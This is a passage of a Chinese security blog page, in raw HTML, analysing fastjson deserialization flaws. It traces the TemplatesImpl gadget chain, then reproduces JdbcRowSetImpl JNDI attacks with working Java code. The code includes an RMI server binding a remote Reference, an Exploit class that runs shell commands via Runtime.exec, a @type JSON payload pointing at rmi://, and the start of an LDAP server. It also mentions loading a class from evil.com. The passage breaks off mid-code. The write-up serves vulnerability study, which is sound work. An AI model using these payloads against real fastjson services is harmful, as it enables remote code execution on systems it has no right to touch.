com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</span>\n<span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">parseField</span><span class="token punctuation">(</span><span class="token class-name">DefaultJSONParser</span> parser<span class="token punctuation">,</span> <span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">Object</span> object<span class="token punctuation">,</span> <span class="token class-name">Type</span> objectType<span class="token punctuation">,</span>\n                              <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> fieldValues<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token class-name">JSONLexer</span> lexer <span class="token operator">=</span> parser<span class="token punctuation">.</span>lexer<span class="token punctuation">;</span> <span class="token comment">// xxx</span>\n\n    <span class="token class-name">FieldDeserializer</span> fieldDeserializer <span class="token operator">=</span> <span class="token function">smartMatch</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n    <span class="token comment">// ....</span>\n<span class="token punctuation">}</span>\n\n<span class="token comment">// com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+T+'" alt="image" loading="lazy">​</p><p>​<img src="'+F+'" alt="image" loading="lazy">​</p><p>反序序列化之后，最后通过 <code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code>​ 执行了 TemplatesImpl 的利用链。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">TemplatesImpl</span>#<span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n<span class="token class-name">TemplatesImpl</span>#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n    <span class="token class-name">TemplatesImpl</span>#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n        <span class="token class-name">TemplatesImpl</span>#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n            <span class="token class-name">TransletClassLoader</span>#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+C+'" alt="image" loading="lazy">​</p><h4 id="结合-templatesimpl-利用链条件" tabindex="-1"><a class="header-anchor" href="#结合-templatesimpl-利用链条件"><span>结合 TemplatesImpl 利用链条件</span></a></h4><p>需要结合 TemplatesImpl 利用链来进行说明，主要是 <code>TemplatesImpl#defineTransletClasses</code>​ 里面的判断。</p><p>条件如下：</p><ul><li>​<code>_class == null;</code>​</li><li>​<code>_name != null;</code>​</li><li>​<code>_bytecodes != null</code></li></ul><p><strong>【逻辑是这样的】</strong></p><ol><li>先判断 <code>_bytecodes</code>​​​ 是否为空，如果不为空，则会调用到自定义的 <code>ClassLoader</code>​​​ 去加载 <code>_bytecodes</code>​​​ 中的 <code>byte[]</code>​​​，并对类的父类进行判断，如果是 <code>ABSTRACT_TRANSLET</code>​​​ 也就是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>​​​，那么就把类成员属性的 <code>_transletIndex</code>​​​ 设置成当前循环中的标记位，第一次调用的话，就是 <code>class[0]</code>​​​。</li><li>可以看到，这里的 <code>_bytecodes</code>​​​ 和 <code>_outputProperties</code>​​​ 都是类成员变量。同时，<code>_outputProperties</code>​​​ 有自己的 <code>getter</code>​​​ 方法，也就是 <code>getOutputProperties</code>​​​。 TemplatesImpl 反序列化过程中会调用 getOutputProperties 方法， 导致 bytecodes 字节码成功实例化造成 RCE。</li></ol><p>​<img src="'+P+'" alt="image" loading="lazy">​</p><h4 id="调试分析" tabindex="-1"><a class="header-anchor" href="#调试分析"><span>调试分析</span></a></h4><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span><span class="token constant">JSON</span>#parseObject\n  <span class="token comment">// 对 JSON 内容进行扫描，在 switch 语句中匹配上了”{“即对应 12</span>\n  <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>DefaultJSONParser</span>#<span class="token class-name">DefaultJSONParser</span>\n  <span class="token comment">// 然后对 JSON 数据调用 DefaultJSONParser.parseObject() 进行解析</span>\n  <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>DefaultJSONParser</span>#parseObject\n    <span class="token comment">// 通过 for 语句循环解析 JSON 数据内容，其中 skipWhitespace() 函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用 scanSymbol() 获取双引号内的内容</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+z+'" alt="image" loading="lazy">​</p><p>判断 key 是否为 <code>@type</code>​ 且是否关闭了 Feature.DisableSpecialKeyDetect 设置，通过判断后调用 <code>scanSymbol()</code>​ 获取到了 <code>@type</code>​ 对应的指定类 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，并调用 <code>TypeUtils.loadClass()</code>​ 函数加载该类。</p><p>​<img src="'+D+'" alt="image" loading="lazy">​</p><p>​<img src="'+R+'" alt="image" loading="lazy">​</p><p>看到如红框的两个判断语句代码逻辑，是判断当前类名是否以 <code>[</code>​ 开头或以 <code>L</code>​ 开头以 <code>;</code>​ 结尾。当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说<strong>这两个判断条件是后面补丁绕过的漏洞点。</strong></p><hr><p>通过 <code>ClassLoader.loadClass()</code>​ 加载到目标类后，然后将该类名和类缓存到 Map 中，最后返回该加载的类。</p><p>返回后，程序继续回到 <code>DefaultJSONParser.parseObject()</code>​ 中往下执行，在最后调用 <code>JavaBeanDeserializer.deserialze()</code>​ 对目标类进行反序列化。</p><p>​<img src="'+L+'" alt="image" loading="lazy">​</p><hr><h3 id="总结-1-1" tabindex="-1"><a class="header-anchor" href="#总结-1-1"><span>总结 1_1</span></a></h3><p>构造一个 TemplatesImpl 类的反序列化字符串，其中 <code>_bytecodes</code>​ 是我们构造的恶意类的类字节码，这个类需要继承 <code>AbstractTranslet</code>​，最终这个类会被加载并使用 <code>newInstance()</code>​ 实例化。</p><p>在反序列化过程中，由于 <code>getter</code>​ 方法 <code>getOutputProperties()</code>​ 满足条件，将会被 <code>fastjson</code>​ 调用，而这个方法触发了 TemplatesImpl 利用链流程。</p><p>限制条件也很明显：需要代码中加了 <code>Feature.SupportNonPublicField</code>​。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">TemplatesImpl</span>#<span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n<span class="token class-name">TemplatesImpl</span>#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n    <span class="token class-name">TemplatesImpl</span>#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n        <span class="token class-name">TemplatesImpl</span>#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n            <span class="token class-name">TransletClassLoader</span>#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="jdbcrowsetimpl-exploit" tabindex="-1"><a class="header-anchor" href="#jdbcrowsetimpl-exploit"><span>JdbcRowSetImpl Exploit</span></a></h3><p>基于 JdbcRowSetImpl 的利用链主要有两种利用方式，即 JNDI+RMI 和 JNDI+LDAP，都是属于基于 Bean Property 类型的 JNDI 的利用方式。</p><ul><li>JNDI + RMI(CVE-2017-3241)/利用 RMI 构造 EXP 实现远程代码执行</li><li>JNDI + LDAP</li><li>基于 RMI 利用的 JDK 版本 <code>≤ 6u141、7u131、8u121</code>​​</li><li>基于 LDAP 利用的 JDK 版本 <code>≤ 6u211、7u201、8u191</code>​​</li><li>不需要设置 <code>Feature.SupportNonPublicField</code>​​</li></ul><h4 id="jndi-rmi-利用复现" tabindex="-1"><a class="header-anchor" href="#jndi-rmi-利用复现"><span>JNDI + RMI 利用复现</span></a></h4><ul><li><strong>@type：</strong> 目标反序列化类名；</li><li><strong>dataSourceName：</strong> RMI 注册中心绑定恶意服务（恶意类名）；</li><li><strong>autoCommit：</strong> 调用 setAutoCommit 方法，利用 lookup 方法加载远程对象。</li></ul><p><strong>【 RMIServer】</strong></p><p>RMI 服务，注册表绑定了 Exploit 服务，该服务是指向恶意 Exploit.class 文件所在服务器的 Reference。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token constant">JNDI</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span>\n    <span class="token doc-comment comment">/**\n     * RMIServer 启动\n     * <span class="token keyword">@param</span> <span class="token parameter">args</span>\n     */</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">AlreadyBoundException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>\n        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Java RMI registry created. port on 1099&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n      \n        <span class="token comment">// http://127.0.0.1:8000/ 是存放恶意类的服务地址</span>\n        <span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://127.0.0.1:8000/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">&quot;Exploit&quot;</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【Exploit Class】</strong></p><p>恶意类，单独编译成 class 文件并放置于 RMI 服务指向的三方 Web 服务中，作为一个 Factory 绑定在注册表服务中。</p><p>注意如果恶意类是在包中的话，RMIServer 中需要加上包名作为 factory，不然可以看到有请求，但是由于类不对会加载失败。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// http://127.0.0.1:8000/ 是存放恶意类的服务地址</span>\n<span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;EXP.Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;EXP.Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://127.0.0.1:8000/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token comment">// 或者</span>\n<span class="token comment">// http://127.0.0.1:8000/ 是存放恶意类的服务地址</span>\n<span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;随便什么名字&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;EXP.Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://127.0.0.1:8000/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+M+'" alt="image" loading="lazy">​</p><p>可以使用 Python 起一个简单的 HTTP 服务。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token constant">EXP</span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">try</span> <span class="token punctuation">{</span>\n            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">&quot;os.name&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">&quot;win&quot;</span><span class="token punctuation">)</span>\n                    <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;cmd.exe&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;/c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">}</span>\n                    <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;touch /tmp/hacked&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>\n            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token class-name">Exploit</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【JdbcRowSetImplPoc】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;rmi://localhost:1099/Exploit\\&quot;, \\&quot;autoCommit\\&quot;:true}&quot;</span><span class="token punctuation">;</span>\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n<span class="token comment">// 这里的 rmi 请求主要是看 bind name</span>\n<span class="token comment">// registry.bind(&quot;Exploit&quot;, referenceWrapper);</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+W+'" alt="image" loading="lazy">​</p><p>【<strong>整体结构】</strong></p><p>​<img src="'+_+'" alt="image" loading="lazy">​</p><h4 id="注意事项" tabindex="-1"><a class="header-anchor" href="#注意事项"><span>注意事项</span></a></h4><p>这里遇到一个问题，由于我这是在同一个项目下的，哪怕的我的 Web 服务没起来，也能正常的弹出计算器，根本没去请求 Web 目录下的恶意类文件，一开始还以为是缓存的问题，因为一开始是正常的，后面就不正常了。。。</p><p><strong>原因：</strong> 客户端获取到 ReferenceWrapper 对象开始从本地 CLASSPATH 中搜索 EvilObject 类，如果不存在则会从 http://evil.com/ 上获取 http://evil.com/EvilObject.class 字节码。</p><p>将 IDEA 编译出来的 target 目录下的 Exploit.class 复制到 <code>D:\\Testby</code>​ 目录，并删除当前目录下的 <code>.class</code>​ 文件。然后从新运行 <code>JdbcRowSetImplPoc</code>​ 进行测试，发现他会按照类的 <strong>&quot;全限定类名&quot;（Fully Qualified Class Name）</strong> 进行请求，所以新建一个 EXP 目录并把 <code>Exploit.class</code>​ 放入其中。</p><p>​<img src="'+U+'" alt="image" loading="lazy">​</p><p>‍</p><p>​<img src="'+Y+'" alt="image" loading="lazy">​</p><p>就算修改你的 RMIServer 请求到了文件，因为你的 Exploit.class 实际上是 EXP.Exploit 类（全限定类名），所以反序列化的时候还是会失败。</p><p>​<img src="'+G+'" alt="image" loading="lazy">​</p><h4 id="jndi-ldap-利用复现" tabindex="-1"><a class="header-anchor" href="#jndi-ldap-利用复现"><span>JNDI + LDAP 利用复现</span></a></h4><p>ldap 的优势在于支持更高的 java 版本，poc 的区别只是请求协议为 <code>ldap://</code>​。</p><p><strong>【LDAPServer】</strong></p>',191),bn={href:"https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk",target:"_blank",rel:"noopener noreferrer"},gn=(0,t.Fv)('<div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.unboundid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>unboundid-ldapsdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token constant">JNDI</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span></span><span class="token class-name">InMemoryDirectoryServer</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span></span><span class="token class-name">InMemoryDirectoryServerConfig</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span></span><span class="token class-name">InMemoryListenerConfig</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryInterceptedSearchResult</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryOperationInterceptor</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">Entry</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">LDAPException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">LDAPResult</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">ResultCode</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocketFactory</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">SocketFactory</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ssl<span class="token punctuation">.</span></span><span class="token class-name">SSLSocketFactory</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">InetAddress</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token punctuation">{</span>\n\n    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">LDAP_BASE</span> <span class="token operator">=</span> <span class="token string">&quot;dc=example,dc=com&quot;</span><span class="token punctuation">;</span>\n\n\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> main <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n\n        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8000/#Exploit&quot;</span><span class="token punctuation">;</span>\n        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">1389</span><span class="token punctuation">;</span>\n\n\n        <span class="token keyword">try</span> <span class="token punctuation">{</span>\n            <span class="token class-name">InMemoryDirectoryServerConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServerConfig</span><span class="token punctuation">(</span><span class="token constant">LDAP_BASE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            config<span class="token punctuation">.</span><span class="token function">setListenerConfigs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InMemoryListenerConfig</span><span class="token punctuation">(</span>\n                    <span class="token string">&quot;listen&quot;</span><span class="token punctuation">,</span>\n                    <span class="token class-name">InetAddress</span><span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">&quot;0.0.0.0&quot;</span><span 